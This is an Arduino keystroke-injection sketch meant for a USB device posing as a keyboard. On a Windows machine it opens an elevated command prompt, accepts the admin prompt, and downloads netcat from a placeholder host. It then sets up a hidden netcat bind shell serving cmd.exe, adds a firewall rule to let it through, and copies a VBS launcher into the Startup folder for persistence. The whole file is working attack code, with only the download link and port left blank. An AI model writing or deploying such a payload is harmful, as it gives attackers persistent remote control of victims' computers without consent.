#include <Keyboard.h> 

void setup() {
  Keyboard.begin();

    

    for(int i = 0; i < 2; i++) {
    
    }
delay(200);
//--> MINIMIZE ALL WINDOWS
    
type(KEY_LEFT_GUI,false);
type('D',false);
Keyboard.releaseAll();
    
type(KEY_LEFT_GUI,false);
type('R',false);
Keyboard.releaseAll();
delay(500);

print(F("POWERSHELL START-PROCESS CMD -VERB RUNAS"));
    
type(KEY_RETURN,false);
Keyboard.releaseAll();
delay(1500);
    
type(KEY_LEFT_ALT,false);
type('Y',false);
Keyboard.releaseAll();
delay(500);

print(F("CD %TEMP%"));
    
type(KEY_RETURN,false);
Keyboard.releaseAll();


print(F("TASKKILL /IM NC.EXE /F"));
    
type(KEY_RETURN,false);
Keyboard.releaseAll();

print(F("ERASE /Q NC.EXE"));
    
type(KEY_RETURN,false);
Keyboard.releaseAll();

print(F("ERASE /Q START.BAT"));
    
type(KEY_RETURN,false);
Keyboard.releaseAll();

print(F("ERASE /Q INVISIBLE.VBS"));
    
type(KEY_RETURN,false);
Keyboard.releaseAll();


print(F("ERASE /Q \"C:\\PROGRAMDATA\\MICROSOFT\\WINDOWS\\START MENU\\PROGRAMS\\STARTUP\\INVISIBLE.VBS\""));
    
type(KEY_RETURN,false);
Keyboard.releaseAll();
delay(500);

print(F("POWERSHELL (NEW-OBJECT SYSTEM.NET.WEBCLIENT).DOWNLOADFILE('HTTP://[NETCAT_DOWNLOAD_LINK]/NC.EXE','NC.EXE')"));
    
type(KEY_RETURN,false);
Keyboard.releaseAll();
delay(500);
    

print(F("COPY CON START.BAT"));
    
type(KEY_RETURN,false);
Keyboard.releaseAll();

print(F("NC -LP [PORT] -VV -E CMD.EXE -L"));
    
type(KEY_RETURN,false);
Keyboard.releaseAll();
    
type(KEY_LEFT_CTRL,false);
type('Z',false);
Keyboard.releaseAll();
    
type(KEY_RETURN,false);
Keyboard.releaseAll();
    
//--> STARTS BATCH FILE INVISIBLY

print(F("COPY CON INVISIBLE.VBS"));
    
type(KEY_RETURN,false);
Keyboard.releaseAll();

print(F("SET WSHSHELL = CREATEOBJECT(\"WSCRIPT.SHELL\" )"));
    
type(KEY_RETURN,false);
Keyboard.releaseAll();

print(F("WSHSHELL.RUN CHR(34) & \"%TEMP%\\START.BAT\" & CHR(34), 0"));
    
type(KEY_RETURN,false);
Keyboard.releaseAll();

print(F("SET WSHSHELL = NOTHING"));
    
type(KEY_RETURN,false);
Keyboard.releaseAll();
    
type(KEY_LEFT_CTRL,false);
type('Z',false);
Keyboard.releaseAll();
    
type(KEY_RETURN,false);
Keyboard.releaseAll();

print(F("NETSH ADVFIREWALL FIREWALL ADD RULE NAME=\"NETCAT\" DIR=IN ACTION=ALLOW PROGRAM=\"%TEMP%\\NC.EXE\" ENABLE=YES"));
    
type(KEY_RETURN,false);
Keyboard.releaseAll();
    

print(F("START INVISIBLE.VBS"));
    
type(KEY_RETURN,false);
Keyboard.releaseAll();
delay(100);

print(F("COPY \"INVISIBLE.VBS\" \"C:\\PROGRAMDATA\\MICROSOFT\\WINDOWS\\START MENU\\PROGRAMS\\STARTUP\""));
    
type(KEY_RETURN,false);
Keyboard.releaseAll();

print(F("EXIT"));
    
type(KEY_RETURN,false);
Keyboard.releaseAll();
Keyboard.end();
}
void type(int key, boolean release) {
  Keyboard.press(key);
  if(release)
    Keyboard.release(key);
}
void print(const __FlashStringHelper *value) {
  Keyboard.print(value);
}
void loop(){}
